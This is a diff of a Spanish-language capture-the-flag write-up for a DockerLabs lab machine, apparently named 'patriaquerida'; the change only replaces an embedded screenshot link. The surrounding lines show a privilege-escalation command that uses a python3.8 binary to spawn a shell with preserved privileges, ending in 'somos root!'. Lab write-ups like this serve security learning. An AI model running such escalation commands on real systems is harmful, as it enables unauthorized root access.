@@ -55,6 +55,6 @@ modificamos el python a python3.8 como el binario y lanzamos
 
      python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 
-![[dockerlabs/facil/patriaquerida/root.png]]
+![image](https://github.com/user-attachments/assets/1c611e03-21bb-441c-9bb4-87460a6903b5)
 
 somos root!
